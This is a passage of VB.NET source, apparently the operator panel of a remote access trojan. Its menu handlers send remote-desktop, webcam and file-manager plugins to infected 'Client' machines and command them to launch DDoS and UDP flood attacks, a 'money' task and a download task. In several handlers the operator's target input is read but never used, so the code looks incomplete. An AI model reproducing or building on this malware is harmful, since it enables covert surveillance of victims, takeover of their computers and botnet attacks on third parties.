                    reg.Text = Conversions.ToString(ind.vno(reg.sk.L))
                    reg.Show()
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RemoteDesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("PEPSI-S.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RemoteCamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteCamToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("PEPSI-c.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub FileManagerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FileManagerToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("PEPSI-F.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub TrackBar1_Scroll_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TrackBar1.Scroll
        Me.Opacity = TrackBar1.Value / 100
        Label3.Text = TrackBar1.Value
    End Sub


    Private Sub SimpleAttackToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SimpleAttackToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attack", "", -1, -1)
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {(ind.Y & "ddos")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub UDPAttackToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UDPAttackToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str1 As String = Interaction.InputBox("WebSite IP :", "DDos Attack", "", -1, -1)
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {(ind.Y & "UDP")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub GetMoneyToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetMoneyToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim URL As String = InputBox("URL", "Your Adfoc.us URL", "-------")
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {(ind.Y & "money")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub GjgjToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GjgjToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {(ind.Y & "Down")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
End Class
